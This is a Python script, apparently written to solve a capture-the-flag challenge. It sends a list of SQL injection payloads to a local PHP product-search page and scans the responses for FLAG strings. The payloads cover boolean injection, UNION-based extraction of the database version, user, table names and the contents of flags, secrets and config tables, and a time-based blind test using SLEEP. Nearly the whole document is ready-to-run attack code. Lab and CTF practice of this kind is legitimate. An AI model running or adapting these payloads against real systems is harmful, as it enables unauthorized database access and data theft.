import requests
import re
import time

# Configuration
target_url = "http://127.0.0.1:8081/sku_search.php"
cookies = {"PHPSESSID": "05049af6efd6ed216b8a2e6938639807"}

print("SQL INJECTION VULNERABILITY TEST")
print("=" * 60)
print(f"Target: {target_url}")
print(f"Session: {cookies}")
print("=" * 60)
print()

# Baseline request to compare responses
baseline_data = {"search": "TEST001"}
try:
    baseline_resp = requests.post(target_url, data=baseline_data, cookies=cookies, timeout=5)
    baseline_size = len(baseline_resp.text)
    print(f"[+] Baseline response size: {baseline_size} bytes")
    print()
except:
    baseline_size = 0
    print("[!] Could not establish baseline")
    print()

# SQL Injection payloads
payloads = [
    # Basic SQL injection tests
    ("Test' OR '1'='1", "boolean_true"),
    ("Test' OR '1'='2", "boolean_false"),
    
    # Union-based SQLi to extract database info
    ("Test' UNION SELECT version(),'name','desc'-- ", "union_version"),
    ("Test' UNION SELECT database(),'name','desc'-- ", "union_database"),
    ("Test' UNION SELECT user(),'name','desc'-- ", "union_user"),
    
    # Extract table names
    ("Test' UNION SELECT table_name,table_name,table_name FROM information_schema.tables WHERE table_schema=database()-- ", "union_tables"),
    
    # Extract all data from articles table
    ("Test' UNION SELECT sku,name,description FROM articles-- ", "union_articles"),
    
    # Try to find flags in the database
    ("Test' UNION SELECT flag,flag,flag FROM flags-- ", "union_flags"),
    ("Test' UNION SELECT secret,secret,secret FROM secrets-- ", "union_secrets"),
    ("Test' UNION SELECT data,data,data FROM config-- ", "union_config"),
    
    # Time-based blind SQLi
    ("Test' AND SLEEP(3)-- ", "time_sleep"),
]

found_flags = []
vulnerable = False

for idx, (payload, ptype) in enumerate(payloads, 1):
    print(f"[{idx}/{len(payloads)}] Testing: {ptype}")
    print(f"Payload: {payload[:80]}...")
    
    try:
        start_time = time.time()
        data = {"search": payload}
        response = requests.post(target_url, data=data, cookies=cookies, timeout=10)
        elapsed = time.time() - start_time
        
        print(f"Status: {response.status_code} | Size: {len(response.text)} bytes | Time: {elapsed:.2f}s")
        
        # Check for flags in response
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"[!] FLAG FOUND: {flags[0]}")
            found_flags.extend(flags)
            vulnerable = True
        
        # Check for SQL errors
        if "SQL" in response.text or "sql" in response.text.lower() or "mysql" in response.text.lower():
            error_match = re.search(r'(SQL[^<]{0,100}|sql[^<]{0,100})', response.text, re.IGNORECASE)
            if error_match:
                print(f"[!] SQL Error detected: {error_match.group(1)}")
        
        # Check for time-based blind SQLi
        if "time" in ptype and elapsed >= 3:
            print(f"[!] Time-based SQLi confirmed - delay detected!")
            vulnerable = True
        
        # Check for union-based success indicators
        if "union" in ptype:
            # Look for extracted data patterns
            if "version()" not in response.text and len(response.text) > baseline_size + 50:
                print(f"[+] Data extracted - response larger than baseline")
                # Show extracted data preview
                preview = response.text[baseline_size:baseline_size+200] if baseline_size else response.text[:200]
                print(f"Preview: {preview}")
        
        print("-" * 60)
        
    except requests.exceptions.Timeout:
        print(f"[!] Timeout after 10s - possible SQLi success (time-based)")
        print("-" * 60)
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        print("-" * 60)

# Summary
print("=" * 60)
print("TEST SUMMARY")
print("=" * 60)
if found_flags:
    print(f"[!] SUCCESS: Found {len(found_flags)} flag(s)")
    for flag in found_flags:
        print(f"  - {flag}")
elif vulnerable:
    print("[+] VULNERABILITY CONFIRMED but no flag found yet")
    print("[+] Try more advanced extraction techniques")
else:
    print("[-] Basic SQLi tests did not reveal vulnerability")
    print("[+] May need encoding or filter bypass")

print("\nTest complete.")
